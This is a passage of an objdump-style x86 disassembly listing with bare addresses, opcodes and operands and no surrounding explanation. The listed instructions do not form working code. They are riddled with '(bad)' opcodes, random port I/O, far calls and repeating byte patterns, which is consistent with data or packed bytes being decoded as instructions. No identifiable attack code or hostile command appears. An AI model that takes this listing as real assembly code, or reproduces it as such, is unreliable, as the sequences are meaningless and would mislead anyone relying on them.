  49d7af:	imul   esp,DWORD PTR [edx+0x51],0x8d0b5c0b
  49d7b6:	(bad)  
  49d7b7:	aam    0x53
  49d7b9:	xchg   DWORD PTR [ebp+edi*4+0x2],esi
  49d7bd:	test   BYTE PTR [bp+di+0xf70],0xb2
  49d7c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  49d7c4:	add    DWORD PTR [eax+esi*2+0x7a],eax
  49d7c8:	aaa    
  49d7c9:	add    DWORD PTR [edi-0x9],ecx
  49d7cc:	jne    0x49d838
  49d7ce:	mov    eax,0x4e1eff1b
  49d7d3:	jae    0x49d813
  49d7d5:	pusha  
  49d7d6:	add    bl,al
  49d7d8:	cli    
  49d7d9:	adc    al,dl
  49d7db:	pop    edi
  49d7dc:	xor    ebx,DWORD PTR [ebx]
  49d7de:	rcr    BYTE PTR [ecx+0x5],0x6a
  49d7e2:	mov    edi,0xb8ef3f1e
  49d7e7:	jns    0x49d820
  49d7e9:	xchg   ebp,eax
  49d7ea:	add    esp,DWORD PTR [esi+0x3f]
  49d7ed:	or     BYTE PTR [ebp-0x4787a1f2],ah
  49d7f3:	xchg   DWORD PTR [edi-0x2d],esp
  49d7f6:	add    ebx,DWORD PTR [edx-0x73ef048]
  49d7fc:	mov    bh,0x37
  49d7fe:	sub    eax,0xd61e01f0
  49d803:	xchg   ebx,eax
  49d804:	or     BYTE PTR [eax-0x54a3494],0x7d
  49d80b:	xchg   edi,eax
  49d80c:	mov    eax,ds:0x87cab8f7
  49d811:	cmp    ah,BYTE PTR [ebx+0xe835797]
  49d817:	xchg   BYTE PTR [eax],bl
  49d819:	mov    eax,0x5e84f808
  49d81e:	or     edx,0x77cade75
  49d824:	jle    0x49d88f
  49d826:	push   es
  49d827:	lods   al,BYTE PTR ds:[esi]
  49d828:	retf   0x67de
  49d82b:	mov    edx,0xe9d7b83e
  49d830:	fisubr DWORD PTR [esi]
  49d832:	mov    edi,0x885bef9f
  49d837:	mov    bh,0xbc
  49d839:	add    bh,bl
  49d83b:	pop    edx
  49d83c:	sbb    eax,0x66b6993f
  49d841:	add    ecx,0x207f873f
  49d847:	test   eax,0xd50196ea
  49d84c:	aas    
  49d84d:	lock iret 
  49d84f:	ds out dx,eax
  49d851:	sbb    ecx,0x4606e1f1
  49d857:	cli    
  49d858:	add    BYTE PTR [edi],bh
  49d85a:	push   es
  49d85b:	pop    ds
  49d85c:	pop    es
  49d85d:	lock out 0x79,eax
  49d860:	push   es
  49d861:	imul   eax,DWORD PTR [ebx],0x4ae7f6f8
  49d867:	push   ebx
  49d868:	stc    
  49d869:	mov    ebp,0x68036c6
  49d86e:	add    BYTE PTR [ecx],al
  49d870:	rol    BYTE PTR [ebx],0xe0
  49d873:	push   0x196d346
  49d878:	arpl   WORD PTR [edi],di
  49d87a:	mov    ebp,0x91847907
  49d87f:	cmp    DWORD PTR [edi],ebx
  49d881:	repz sahf 
  49d883:	adc    BYTE PTR [edi],al
  49d885:	or     bh,BYTE PTR [ecx+0x70020a4]
  49d88b:	addr16 std 
  49d88d:	enter  0x1091,0xf
  49d891:	retf   0x7d7
  49d894:	xor    edx,DWORD PTR [edi+0x10878ec2]
  49d89a:	data16 mov BYTE PTR [eax+eiz*1],dl
  49d89e:	mov    eax,0xc3993777
  49d8a3:	or     edi,DWORD PTR [edi+0x38887ba3]
  49d8a9:	sbb    BYTE PTR ds:0x9a3d,bl
  49d8ae:	(bad)  
  49d8af:	lods   eax,DWORD PTR ds:[esi]
  49d8b0:	add    BYTE PTR [edi+0xe],dh
  49d8b3:	mov    eax,DWORD PTR [ebx-0x4ad18071]
  49d8b9:	into   
  49d8ba:	and    DWORD PTR [esi],ecx
  49d8bc:	(bad)  
  49d8bd:	fisubr WORD PTR [esi]
  49d8c0:	cmp    DWORD PTR [edi-0x8],0xffffffbe
  49d8c4:	fdivr  DWORD PTR [edi+0x70]
  49d8c7:	aas    
  49d8c8:	loopne 0x49d86c
  49d8ca:	jnp    0x49d8d8
  49d8cc:	jo     0x49d89d
  49d8ce:	jnp    0x49d850
  49d8d0:	movzx  ecx,BYTE PTR [esi+eiz*2]
  49d8d4:	ja     0x49d8c6
  49d8d6:	pop    ds
  49d8d7:	or     BYTE PTR [eax+0xffe06cf],cl
  49d8dd:	xor    ah,BYTE PTR [eax]
  49d8df:	and    eax,DWORD PTR [edi-0x10]
  49d8e2:	add    DWORD PTR [eax],eax
  49d8e4:	pop    es
  49d8e5:	jno    0x49d8c9
  49d8e7:	and    al,0x17
  49d8e9:	jg     0x49d86b
  49d8eb:	(bad)  
  49d8ec:	out    dx,eax
  49d8ed:	lods   eax,DWORD PTR ds:[esi]
  49d8ee:	pusha  
  49d8ef:	bound  ebp,QWORD PTR [eax+0x4d]
  49d8f2:	or     DWORD PTR [ebx-0x1e5dbc7d],ebp
  49d8f8:	(bad)  
  49d8f9:	dec    edi
  49d8fa:	inc    edi
  49d8fb:	push   esi
  49d8fc:	ins    BYTE PTR es:[edi],dx
  49d8fd:	mov    dh,0x83
  49d8ff:	xchg   BYTE PTR [edi+0x8],cl
  49d902:	add    BYTE PTR [eax],al
  49d904:	pop    ss
  49d905:	add    BYTE PTR [edi],ah
  49d907:	int    0x66
  49d909:	mov    bl,0xd9
  49d90b:	add    BYTE PTR [edi],dh
  49d90d:	add    BYTE PTR [edi+0x0],al
  49d910:	push   edi
  49d911:	add    BYTE PTR [edi+0x0],ah
  49d914:	fldcw  WORD PTR [esi+esi*1-0x65]
  49d918:	ja     0x49d91a
  49d91a:	xchg   DWORD PTR [eax],eax
  49d91c:	xchg   edi,eax
  49d91d:	add    BYTE PTR [edi-0x32674900],ah
  49d923:	data16 mov bl,0x0
  49d926:	mov    DWORD PTR [eax],0xe700d7
  49d92c:	neg    ecx
  49d92e:	(bad)  
  49d92f:	popf   
  49d930:	sbb    al,0x70
  49d932:	dec    esp
  49d933:	mov    dl,0x6
  49d935:	in     eax,0x0
  49d937:	sbb    DWORD PTR [ecx],ebx
  49d939:	jmp    DWORD PTR [edx]
  49d93b:	dec    esp
  49d93c:	dec    bh
  49d93e:	repz pop esi
  49d940:	mov    bl,0x7f
  49d942:	push   DWORD PTR [edx+0x1b3e10c8]
  49d948:	xor    DWORD PTR es:[edi+ecx*8],edi
  49d94c:	repz cmp al,0x4a
  49d94f:	jb     0x49d8eb
  49d951:	ret    0xf320
  49d954:	cmp    al,0xcf
  49d956:	repz ss dec esp
  49d959:	bound  edi,QWORD PTR [ebx-0x67]
  49d95c:	iret   
  49d95d:	repz cmp al,0xcf
  49d960:	mov    dh,0xd3
  49d962:	xor    DWORD PTR [ecx+0x72],edx
  49d965:	xchg   ebx,eax
  49d966:	cmp    al,0xcf
  49d968:	repz cmp al,0xad
  49d96b:	mov    edi,0xf341e3d1
  49d970:	cmp    al,0xcf
  49d972:	rep ins DWORD PTR es:[edi],dx
  49d974:	cdq    
  49d975:	(bad)  
  49d976:	fsubrp st(5),st
  49d978:	fldcw  WORD PTR [esi+edi*1-0x31]
  49d97c:	in     al,dx
  49d97d:	hlt    
  49d97e:	dec    esp
  49d97f:	inc    edi
  49d980:	jg     0x49d9f8
  49d982:	mov    dl,0xa5
  49d984:	fwait
  49d985:	int    0x66
  49d987:	mov    bl,0xe5
  49d989:	aad    0xff
  49d98b:	out    dx,al
  49d98c:	(bad)  
  49d98d:	repnz push ebp
  49d990:	(bad)  
  49d991:	stc    
  49d992:	cmp    al,0xcf
  49d994:	repz cmp al,0x36
  49d997:	pop    ebx
  49d998:	jg     0x49d93d
  49d99a:	mov    ebp,0xf3cf3cf3
  49d99f:	int3   
  49d9a0:	fucompp 
  49d9a2:	es aas 
  49d9a4:	iret   
  49d9a5:	repz cmp al,0xcf
  49d9a8:	pop    ecx
  49d9a9:	jb     0x49d937
  49d9ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49d9ac:	mov    edi,0xf3cf3cd8
  49d9b1:	cmp    al,0x15
  49d9b3:	and    al,0x33
  49d9b5:	inc    ecx
  49d9b6:	pop    ebx
  49d9b7:	repz cmp al,0xcf
  49d9ba:	repz jg 0x49d960
  49d9bd:	enter  0x905,0xce
  49d9c1:	repz cmp al,0xcf
  49d9c4:	or     al,0x10
  49d9c6:	sub    DWORD PTR [ecx-0x78],ebx
  49d9c9:	cmp    al,0x7c
  49d9cb:	push   cs
  49d9cc:	sbb    bl,BYTE PTR [esi+0x19127c0a]
  49d9d2:	mov    dl,0x14
  49d9d4:	in     eax,0xd7
  49d9d6:	ins    BYTE PTR es:[edi],dx
  49d9d7:	mov    dh,0xdf
  49d9d9:	cmp    bh,bh
  49d9db:	sbb    DWORD PTR [eax],eax
  49d9dd:	data16 (bad) 
  49d9df:	sub    BYTE PTR [ecx+0x1bffbdff],dl
  49d9e5:	ds sahf 
  49d9e7:	out    0x79,eax
  49d9e9:	sahf   
  49d9ea:	sub    eax,0x8c6b513f
  49d9ef:	lods   eax,DWORD PTR ds:[esi]
  49d9f0:	jns    0x49d990
  49d9f2:	out    0x79,eax
  49d9f4:	int    0x2b
  49d9f6:	dec    eax
  49d9f7:	gs and edi,0x79
  49d9fb:	sahf   
  49d9fc:	out    0x9c,eax
  49d9fe:	mov    dl,0xc8
  49da00:	fidivr WORD PTR [esi+ebx*4]
  49da03:	out    0x79,eax
  49da05:	sahf   
  49da06:	mov    WORD PTR fs:[ebp+ecx*8-0x61861c28],?
  49da0e:	out    0x79,eax
  49da10:	out    dx,al
  49da11:	dec    esp
  49da12:	jg     0x49d9c6
  49da14:	in     eax,0x53
  49da16:	jns    0x49d9b6
  49da18:	out    0xff,eax
  49da1a:	(bad)  
  49da1b:	(bad)  
  49da1c:	(bad)  
  49da1d:	cmp    al,0xcf
  49da1f:	repz cmp al,0xcf
  49da22:	mov    WORD PTR fs:[ebp+ecx*8-0x30c31c28],?
  49da2a:	repz cmp al,0xee
  49da2d:	sub    ecx,DWORD PTR [eax+0x66]
  49da30:	xor    ebx,0x3c
  49da33:	iret   
  49da34:	repz pushf 
  49da36:	mov    dl,0xc8
  49da38:	ficomp WORD PTR [ebx]
  49da3a:	iret   
  49da3b:	repz cmp al,0xcf
  49da3e:	sub    eax,0x8c6b513f
  49da43:	lods   eax,DWORD PTR ds:[esi]
  49da44:	cmp    al,0xcf
  49da46:	repz cmp al,0xcd
  49da49:	or     dl,BYTE PTR [edx]
  49da4b:	sbb    DWORD PTR [eax],esp
  49da4d:	stc    
  49da4e:	cmp    al,0xcf
  49da50:	repz cmp ah,BYTE PTR [ebp-0x6f]
  49da54:	mov    ebp,0xcd9b0500
  49da59:	data16 mov bl,0x0
  49da5c:	or     DWORD PTR [eax],eax
  49da5e:	or     al,0x0
  49da60:	adc    BYTE PTR [ecx],bl
  49da62:	sub    DWORD PTR [ecx+ebx*2-0x31],ecx
  49da66:	rep ins BYTE PTR es:[edi],dx
  49da68:	ss jg  0x49d9f3
  49da6b:	mov    dl,0xb7
  49da6d:	adc    eax,0xcf3c3224
  49da72:	repz cmp al,0x41
  49da75:	pop    ebx
  49da76:	jg     0x49da1b
  49da78:	enter  0x3cf3,0xcf
  49da7c:	repz es aas 
  49da7f:	pop    ecx
  49da80:	jb     0x49da0e
  49da82:	iret   
  49da83:	repz cmp al,0xcf
  49da86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49da87:	mov    edi,0x7f5b36d8
  49da8c:	cmp    al,0xcf
  49da8e:	repz cmp al,0xa3
  49da91:	mov    ebp,0xf3e9dacc
  49da96:	cmp    al,0xcf
  49da98:	repz inc edi
  49da9a:	jbe    0x49da41
  49da9c:	aad    0xee
  49da9e:	dec    edi
  49da9f:	sar    DWORD PTR ds:0xf9f5f2cf,1
  49daa5:	loop   0x49daa5
  49daa7:	ins    DWORD PTR es:[edi],dx
  49daa8:	cdq    
  49daa9:	cmp    al,0xcf
  49daab:	repz cmp al,0xc4
  49daae:	fsubrp st(5),st
  49dab0:	in     al,dx
  49dab1:	hlt    
  49dab2:	out    0x79,eax
  49dab4:	sahf   
  49dab5:	div    DWORD PTR [ecx]
  49dab7:	ds push ecx
  49dab9:	jb     0x49da4e
  49dabb:	lods   eax,DWORD PTR ds:[esi]
  49dabc:	mov    ebx,0xbf9e79e0
  49dac1:	shl    ebx,1
  49dac3:	and    BYTE PTR [ebx],al
  49dac5:	dec    esp
  49dac6:	ds iret 
  49dac8:	repz cmp al,0xcf
  49dacb:	bound  edi,QWORD PTR [ebx-0x67]
  49dace:	mov    dh,0xd3
  49dad0:	adc    BYTE PTR [edi+ecx*8],bh
  49dad3:	repz cmp al,0x1b
  49dad6:	xor    DWORD PTR es:[edx+0x72],ecx
  49dada:	inc    ebx
  49dadb:	ror    esi,0xf3
  49dade:	call   0xbf7f:0xe40801c2
  49dae5:	push   0x45
  49dae7:	sbb    eax,DWORD PTR [edi]
  49dae9:	adc    eax,0x1b085717
  49daee:	sbb    al,0x1b
  49daf0:	sbb    DWORD PTR [esi],edx
  49daf2:	cld    
  49daf3:	(bad)  
  49daf4:	inc    DWORD PTR [ecx-0x48e3e5e8]
  49dafa:	sbb    bl,BYTE PTR [ecx]
  49dafc:	pop    es
  49dafd:	push   ds
  49dafe:	sbb    BYTE PTR [esi],dl
  49db00:	adc    eax,0x1d1d1513
  49db05:	sbb    eax,0x1b1a191c
  49db0a:	or     BYTE PTR [edi],dl
  49db0c:	div    dh
  49db0e:	sub    al,0x81
  49db10:	dec    esi
  49db11:	push   edx
  49db12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49db13:	inc    edx
  49db14:	cmp    eax,0x48364318
  49db19:	jge    0x49db1b
  49db1b:	stc    
  49db1c:	not    DWORD PTR [eax+edx*1]
  49db1f:	push   ss
  49db20:	push   ds
  49db21:	pusha  
  49db22:	sbb    bl,BYTE PTR [eax]
  49db24:	sbb    DWORD PTR [ebx],ebx
  49db26:	sbb    DWORD PTR [ebx],ebx
  49db28:	sbb    BYTE PTR [ebx],bl
  49db2a:	push   ds
  49db2b:	fucomp st(4)
  49db2d:	fidivr WORD PTR [esi+0x423d3d32]
  49db33:	inc    edx
  49db34:	cmp    al,BYTE PTR [ecx+edi*1]
  49db37:	adc    dl,BYTE PTR [ecx]
  49db39:	adc    BYTE PTR [esi+0x20],bl
  49db3c:	fcomp  QWORD PTR [edx]
  49db3e:	or     BYTE PTR [eax],bl
  49db40:	jnp    0x49dac3
  49db42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49db43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49db44:	les    edx,FWORD PTR [edi]
  49db46:	xchg   edx,eax
  49db47:	push   edx
  49db48:	dec    eax
  49db49:	cmp    bh,BYTE PTR ds:0x6ec05041
  49db4f:	push   es
  49db50:	(bad)  
  49db51:	mov    eax,0x13121211
  49db56:	push   ss
  49db57:	sbb    DWORD PTR [ecx+0x8],edi
  49db5a:	pop    es
  49db5b:	sbb    DWORD PTR [eax],ecx
  49db5d:	(bad)  
  49db5f:	fstp   TBYTE PTR [edi-0x80]
  49db62:	mov    ecx,DWORD PTR [eax]
  49db64:	sbb    dl,BYTE PTR [esi]
  49db66:	adc    DWORD PTR [edx+edi*1],edx
  49db69:	adc    dl,BYTE PTR [eax]
  49db6b:	pop    eax
  49db6c:	adc    al,0x16
  49db6e:	sbb    bl,BYTE PTR ds:0xc1b72016
  49db74:	jnp    0x49db8e
  49db76:	adc    al,0x11
  49db78:	sbb    BYTE PTR [edx+0x1a],ah
  49db7b:	sbb    al,0x62
  49db7d:	sbb    DWORD PTR [edx],ebx
  49db7f:	or     BYTE PTR [ebx+0x70],bl
  49db82:	fistp  QWORD PTR [esi+0x1a]
  49db85:	pop    ss
  49db86:	sbb    BYTE PTR [edi],dl
  49db88:	dec    esi
  49db89:	adc    edx,DWORD PTR [ecx]
  49db8b:	adc    edx,DWORD PTR [edi+edx*1]
  49db8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49db8f:	or     al,0x18
  49db91:	adc    eax,0x6c1348ce
  49db96:	in     eax,dx
  49db97:	adc    BYTE PTR [edx],dl
  49db99:	push   ss
  49db9a:	sbb    BYTE PTR [esi-0x3b1de7f9],dh
  49dba0:	sbb    bh,BYTE PTR [esp+esi*4]
  49dba3:	xor    ebx,DWORD PTR [ebx]
  49dba5:	xor    BYTE PTR [esi+0x241c8cae],bl
  49dbab:	adc    al,0xb3
  49dbad:	mov    ebx,0xc81c135d
  49dbb2:	adc    eax,DWORD PTR [eax]
  49dbb4:	or     dl,BYTE PTR [edi]
  49dbb6:	pop    es
  49dbb7:	sbb    al,0x2
  49dbb9:	ret    0x6600
  49dbbc:	sub    BYTE PTR [ebx],0xb0
  49dbbf:	mov    DWORD PTR ss:[edi],eax
  49dbc2:	add    dh,dh
  49dbc4:	push   esi
  49dbc5:	jge    0x49dbbd
  49dbc7:	dec    esp
  49dbc8:	imul   ebx,DWORD PTR [ebp+edx*1+0xc0112c8],0x64
  49dbd0:	pop    ss
  49dbd1:	sbb    ecx,DWORD PTR [ebx+0xc]
  49dbd4:	mov    ah,ch
  49dbd6:	pusha  
  49dbd7:	sbb    al,0x1a
  49dbd9:	cdq    
  49dbda:	add    al,0x9d
  49dbdc:	sbb    edi,DWORD PTR [ebx+0x6]
  49dbdf:	out    0x54,al
  49dbe1:	adc    eax,0x61e61701
  49dbe6:	pop    es
  49dbe7:	rcl    edx,0x61
  49dbea:	sbb    bl,ch
  49dbec:	push   ss
  49dbed:	xor    al,bl
  49dbef:	mov    cl,0xd3
  49dbf1:	ins    BYTE PTR es:[edi],dx
  49dbf2:	dec    edx
  49dbf3:	or     al,BYTE PTR [edx]
  49dbf5:	pop    ss
  49dbf6:	add    DWORD PTR ds:0x3b4bc151,edx
  49dbfc:	fwait
  49dbfd:	pusha  
  49dbfe:	sbb    ebx,DWORD PTR [eax]
  49dc00:	mov    ebx,0xdee8d0c3
  49dc05:	ret    
  49dc06:	fstp   QWORD PTR [eax]
  49dc08:	push   esi
  49dc09:	nop
  49dc0a:	and    dl,BYTE PTR [edi]
  49dc0c:	add    DWORD PTR ds:0x58a9ab16,ecx
  49dc12:	sub    al,0xe4
  49dc14:	mov    bh,0x1c
  49dc16:	mov    cs,edi
  49dc18:	ss mov eax,0x6dac6cf7
  49dc1e:	arpl   WORD PTR [esi],ax
  49dc20:	sbb    BYTE PTR [ecx],al
  49dc22:	push   0xf231b20b
  49dc27:	mov    dh,0xb8
  49dc29:	sbb    al,ah
  49dc2b:	aam    0x5f
  49dc2d:	ds ds add dh,ch
  49dc31:	xchg   esi,eax
  49dc32:	jl     0x49dc2b
  49dc34:	pop    edx
  49dc35:	pop    es
  49dc36:	bound  eax,QWORD PTR [eax]
  49dc38:	sbb    bl,BYTE PTR [ecx]
  49dc3a:	test   BYTE PTR [edx+0x3dbe09cf],dl
  49dc40:	push   esp
  49dc41:	mov    ebx,0xed3d365e
  49dc46:	aaa    
  49dc47:	sbb    ebp,DWORD PTR [edi+0xefbdcee]
  49dc4d:	cld    
  49dc4e:	add    DWORD PTR [ecx],ebx
  49dc50:	pop    es
  49dc51:	pop    ebp
  49dc52:	pusha  
  49dc53:	adc    al,0xbb
  49dc55:	div    BYTE PTR [ebx+0x3d1abbc3]
  49dc5b:	push   ss
  49dc5c:	repnz xor eax,0x3ed03656
  49dc62:	(bad)  
  49dc63:	test   BYTE PTR [ebp-0x674f4c43],0x69
  49dc6a:	outs   dx,BYTE PTR ds:[esi]
  49dc6b:	mov    ebp,0xbef7dce8
  49dc70:	mov    ch,0xec
  49dc72:	pop    es
  49dc73:	pop    ss
  49dc74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49dc75:	mov    edx,0x33d4a35
  49dc7a:	sbb    BYTE PTR [edx+0x19],al
  49dc7d:	into   
  49dc7e:	pop    esi
  49dc7f:	gs mov bh,0x85
  49dc82:	mov    bl,0xf
  49dc84:	add    al,0xaf
  49dc86:	bound  edi,QWORD PTR [ecx+0x11f1e7d]
  49dc8c:	ja     0x49dc30
  49dc8e:	add    eax,ecx
  49dc90:	push   ds
  49dc91:	push   esi
  49dc92:	jge    0x49dcb6
  49dc94:	dec    ebp
  49dc95:	sbb    DWORD PTR [edx],edi
  49dc97:	pop    ss
  49dc98:	icebp  
  49dc99:	sub    al,0xbb
  49dc9b:	add    BYTE PTR [esi+0x6536363e],cl
  49dca1:	push   eax
  49dca2:	add    dh,BYTE PTR [edi+0x67bf1482]
  49dca8:	xchg   DWORD PTR [ebp+0x5d],edx
  49dcab:	pop    ds
  49dcac:	sbb    eax,0xf7d116bd
  49dcb1:	fnstenv [esi+0x4d]
  49dcb4:	cmp    eax,0x5635c016
  49dcb9:	sbb    bh,BYTE PTR ss:[esi+0x3d]
  49dcbd:	ds nop
  49dcbf:	jbe    0x49dd2e
  49dcc1:	repnz ds xchg edi,eax
  49dcc4:	pop    es
  49dcc5:	pop    esi
  49dcc6:	(bad)  
  49dcc8:	push   ss
  49dcc9:	mov    edi,0x7e1f5536
  49dcce:	pop    es
  49dccf:	dec    ebx
  49dcd0:	pop    ds
  49dcd1:	adc    BYTE PTR [esi+0x1e],0x36
  49dcd5:	mov    edi,0xb9d75f1a
  49dcda:	imul   ecx,DWORD PTR [edi+ecx*1+0x0],0x5f
  49dcdf:	popa   
  49dce0:	sbb    DWORD PTR [edi],esp
  49dce2:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  49dce4:	pop    ss
  49dce5:	frstor [esi-0x55419947]
  49dceb:	pop    esi
  49dcec:	popa   
  49dced:	retf   0x5756
  49dcf0:	sbb    bl,BYTE PTR [edi+0x7]
  49dcf3:	mov    ebx,0x19e4dd06
  49dcf8:	sbb    eax,0x811f610f
  49dcfd:	cmp    eax,0x777ea6ba
  49dd02:	jbe    0x49dd5d
  49dd04:	pop    esi
  49dd05:	mov    edi,0x4f0d0860
  49dd0a:	ds add cl,al
  49dd0d:	push   ds
  49dd0e:	subps  xmm0,XMMWORD PTR [ebx+0x601d704b]
  49dd15:	dec    ecx
  49dd16:	ss cld 
  49dd18:	fstp   DWORD PTR [ebx+0x3a061c55]
  49dd1e:	xchg   esi,eax
  49dd1f:	inc    edx
  49dd20:	push   ebp
  49dd21:	pop    esi
  49dd22:	and    bh,BYTE PTR [esi]
  49dd24:	mov    edi,0x82db4e1c
  49dd29:	add    bh,bl
  49dd2b:	pop    edi
  49dd2c:	test   dl,bh
  49dd2e:	out    dx,al
  49dd2f:	fdivrp st(6),st
  49dd31:	adc    eax,0x164e560c
  49dd36:	inc    edx
  49dd37:	pusha  
  49dd38:	xor    eax,0x7a1b121a
  49dd3d:	and    DWORD PTR [eax],ebx
  49dd3f:	(bad)  
  49dd41:	adc    al,0x37
  49dd43:	push   ds
  49dd44:	pop    ebp
  49dd45:	add    BYTE PTR [eax+0x30619b06],al
  49dd4b:	mov    esp,0x42c0e61c
  49dd50:	pop    ss
  49dd51:	cmp    BYTE PTR [edi+0x5bf6d86d],0x8
  49dd58:	push   esi
  49dd59:	pop    es
  49dd5a:	pop    edi
  49dd5b:	push   ds
  49dd5c:	pop    ebx
  49dd5d:	pop    edi
  49dd5e:	pop    es
  49dd5f:	sbb    bl,BYTE PTR [ecx]
  49dd61:	mov    ah,0x8b
  49dd63:	xor    eax,DWORD PTR [eax]
  49dd65:	dec    ecx
  49dd66:	rol    BYTE PTR [edx+0x35],0x9b
  49dd6a:	(bad)  
  49dd6c:	ret    
  49dd6d:	mov    dh,0xae
  49dd6f:	das    
  49dd70:	pop    ebx
  49dd71:	popa   
  49dd72:	push   ds
  49dd73:	or     al,0xc1
  49dd75:	loopne 0x49ddf2
  49dd77:	and    BYTE PTR [eax],0xa4
  49dd7a:	push   esi
  49dd7b:	pop    esp
  49dd7c:	inc    esi
  49dd7d:	ds loopne 0x49ddb5
  49dd80:	outs   dx,DWORD PTR fs:[esi]
  49dd82:	int3   
  49dd83:	out    dx,al
  49dd84:	sbb    ebx,DWORD PTR [edx]
  49dd86:	mov    WORD PTR [edi+0x4d],ds
  49dd89:	imul   esp,ebx,0x76
  49dd8c:	xchg   DWORD PTR [ebx],eax
  49dd8e:	sbb    al,0x19
  49dd90:	pushf  
  49dd91:	bound  esi,QWORD PTR ds:[edi]
  49dd94:	sbb    al,BYTE PTR [edx+0x4b]
  49dd97:	rcr    ebp,cl
  49dd99:	and    DWORD PTR [edx],0x681a0734
  49dd9f:	lea    ebx,[ebx+0x0]
  49dda2:	out    0xbb,eax
  49dda4:	aaa    
  49dda5:	sbb    eax,0x2fbf1c01
  49ddaa:	sub    cl,BYTE PTR [edi]
  49ddac:	add    DWORD PTR [edi-0x14c67fdc],0x51
  49ddb3:	inc    DWORD PTR [edx+0x34]
  49ddb6:	mov    dh,0x51
  49ddb8:	cmp    ecx,DWORD PTR [ecx+0x3f]
  49ddbb:	inc    esi
  49ddbc:	add    eax,DWORD PTR ss:[eax]
  49ddbf:	repz or al,0x4
  49ddc2:	in     al,0xf5
  49ddc4:	add    al,0x37
  49ddc6:	push   es
  49ddc7:	in     eax,dx
  49ddc8:	ins    BYTE PTR es:[edi],dx
  49ddc9:	vaddss xmm7,xmm4,DWORD PTR [edi+edi*1+0xd762b1e]
  49ddd3:	sbb    bl,BYTE PTR [esi-0x3ba9ccba]
  49ddd9:	pop    edi
  49ddda:	fstp   QWORD PTR [esi]
  49dddc:	xchg   bh,bl
  49ddde:	ss aas 
  49dde0:	mov    esp,0x3c1b4e3e
  49dde5:	and    al,BYTE PTR [ecx]
  49dde7:	sbb    edi,DWORD PTR [ecx+eax*8-0x23]
  49ddeb:	mov    al,ds:0x1e62bcbf
  49ddf0:	xor    eax,0x5f3e4619
  49ddf5:	pop    esp
  49ddf6:	(bad)  
  49ddf7:	and    cl,bl
  49ddf9:	push   esi
  49ddfa:	das    
  49ddfb:	ds aaa 
  49ddfd:	inc    esi
  49ddfe:	aaa    
  49ddff:	inc    esi
  49de00:	inc    edx
  49de01:	loopne 0x49de05
  49de03:	in     eax,dx
  49de04:	push   ss
  49de05:	jnp    0x49de6b
  49de07:	pop    edi
  49de08:	pop    esp
  49de09:	add    ebp,ebp
  49de0b:	push   cs
  49de0c:	fiadd  WORD PTR [ebp+0x36183517]
  49de12:	jnp    0x49ddd4
  49de14:	mov    edi,0x3c59a73f
  49de19:	jl     0x49ddd3
  49de1b:	inc    esi
  49de1c:	dec    esi
  49de1d:	call   DWORD PTR [ebp-0x3a]
  49de20:	aas    
  49de21:	shl    BYTE PTR [ecx+0x57bf681b],0xc3
  49de28:	inc    esi
  49de29:	push   esi
  49de2a:	fdiv   QWORD PTR [ebx-0x21250deb]
  49de30:	jb     0x49de71
  49de32:	mov    esi,0xe443e3e
  49de37:	pushf  
  49de38:	cdq    
  49de39:	pop    edx
  49de3a:	dec    esi
  49de3b:	add    al,0x3f
  49de3d:	(bad)  
  49de3e:	rcl    BYTE PTR [ebx+0x1d],0x6c
  49de42:	add    esi,DWORD PTR [ebx-0x3b]
  49de45:	mov    edi,0x1b001e46
  49de4a:	inc    edx
  49de4b:	and    dh,al
  49de4d:	cmp    BYTE PTR [eax+0x7c],bh
  49de50:	(bad)  
  49de51:	pop    edi
  49de52:	cdq    
  49de53:	fbstp  TBYTE PTR [ebx]
  49de55:	push   0xd7db070
  49de5a:	sbb    BYTE PTR [ebx+0x7a],dh
  49de5d:	jne    0x49ddea
  49de5f:	add    al,BYTE PTR [edi]
  49de61:	pop    edi
  49de62:	fistp  QWORD PTR [ebp-0x23c7dda9]
  49de68:	ret    
  49de69:	push   eax
  49de6a:	xor    eax,0x3c1f5c62
  49de6f:	cmp    al,0xc1
  49de71:	mov    bh,0xc1
  49de73:	inc    edi
  49de74:	cmp    BYTE PTR [edx+0xd573d37],0x4b
  49de7b:	adc    al,0xdf
  49de7d:	pop    edx
  49de7e:	loop   0x49ded7
  49de80:	dec    eax
  49de81:	mov    esp,0x58791b40
  49de86:	inc    esi
  49de87:	aaa    
  49de88:	mov    edi,0xee0c47b6
  49de8d:	mov    ds:0x46499e33,al
  49de92:	pop    ecx
  49de93:	adc    DWORD PTR ds:0x56373070,edi
  49de99:	sahf   
  49de9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  49de9b:	sub    al,BYTE PTR [esi-0x50]
  49de9e:	(bad)  
  49de9f:	out    dx,eax
  49dea0:	stos   BYTE PTR es:[edi],al
  49dea1:	or     BYTE PTR [edi],bh
  49dea3:	mov    cl,0xdf
  49dea5:	pop    eax
  49dea6:	mov    ds:0x3f4ed056,eax
  49deab:	push   ds
  49deac:	push   ds
  49dead:	push   ecx
  49deae:	es push edx
  49deb0:	and    BYTE PTR [eax+0x40044f6f],0x83
  49deb7:	or     al,BYTE PTR [eax-0x1]
  49deba:	mov    eax,ds:0xf9a9d2d
  49debf:	sbb    BYTE PTR [ecx],al
  49dec1:	sbb    DWORD PTR [edi+0x1c1f8f1b],esi
  49dec7:	pop    ss
  49dec8:	adc    al,0xff
  49deca:	pop    ebx
  49decb:	pop    ebx
  49decc:	mov    WORD PTR [esi+esi*2],ss
  49decf:	sbb    al,0x7
  49ded1:	inc    ecx
  49ded2:	arpl   WORD PTR [esp+ebx*1],bx
  49ded5:	pop    ds
  49ded6:	dec    edi
  49ded7:	cmp    eax,0x6664383b
  49dedc:	cld    
  49dedd:	cmp    al,0x19
  49dedf:	adc    eax,DWORD PTR [eax]
  49dee1:	adc    eax,0x771ec40f
  49dee6:	fidiv  WORD PTR [esi+0x1d1a1edf]
  49deec:	push   ss
  49deed:	xor    BYTE PTR ss:[eax],al
  49def0:	adc    BYTE PTR [eax],dh
  49def2:	adc    DWORD PTR [esp+edx*2],edx
  49def5:	push   ds
  49def6:	sbb    al,0x1c
